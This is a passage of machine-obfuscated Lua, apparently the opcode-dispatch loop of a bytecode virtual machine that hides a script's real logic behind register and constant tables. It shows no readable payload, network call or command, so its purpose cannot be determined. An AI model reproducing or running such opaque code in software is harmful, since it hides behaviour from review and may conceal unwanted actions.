A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];elseif c>226 then local D;local a;local A;local C;local c;e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];else if not e[o[2]]then d=d+1;else d=d+o[3];end;end;elseif c<=237 then if c<=232 then if c<=229 then if c==228 then local A;local D,A;local c;local A;local C;local a;e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];a=o[2];C={};A=0;c=a+o[3]-1;for o=a+1,c do A=A+1;C[A]=e[o];end;D,c=J(e[a](r(C,1,c-a)));c=c+a-1;A=0;for o=a,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];a=o[2];C={};A=0;c=B;for o=a+1,c do A=A+1;C[A]=e[o];end;D={e[a](r(C,1,c-a))};c=a+o[5]-2;A=0;for o=a,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];else e[o[2]]=e[o[3]]*n[o[5]];end;elseif c<=230 then local J;local a;local c;local D;local C;local A;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[n[o[5]]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];d=d+o[3];elseif c>231 then local D;local a;local A;local C;local c;c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];else local A;local D,A;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D,a=J(e[c](r(C,1,a-c)));a=a+c-1;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];c=o[2];C={};A=0;a=B;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D,a=J(e[c](r(C,1,a-c)));a=a+c-1;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];c=o[2];C={};A=0;a=B;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];d=d+o[3];end;elseif c<=234 then if c==233 then local J;local a;local c;local D;local C;local S;local E;local K;local W;local I;local A;f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];A=o[2];I={};for o=1,#T do W=T[o];for o=0,#W do K=W[o];E=K[1];S=K[2];if E==e and S>=A then I[S]=E[S];K[1]=I;end;end;end;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[n[o[5]]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C=e[o[3]];e[A+1]=C;e[A]=C[e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];else local C;local A;local c;local a;local f;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];f=o[2];a=e[o[3]];e[f+1]=a;e[f]=a[n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];f=o[2];c={};A=0;C=f+o[3]-1;for o=f+1,C do A=A+1;c[A]=e[o];end;e[f](r(c,1,C-f));B=f;d=d+1;o=l[d];do return end;end;elseif c<=235 then local o=o[2];local d={};local l=B;for o=o+1,l do d[#d+1]=e[o];end;do return e[o](r(d,1,l-o))end;elseif c>236 then e[o[2]]=n[o[3]];else local D;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];end;elseif c<=242 then if c<=239 then if c>238 then local D;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;else e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];end;elseif c<=240 then e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];elseif c>241 then local D;local a;local A;local C;local c;e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]-e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do 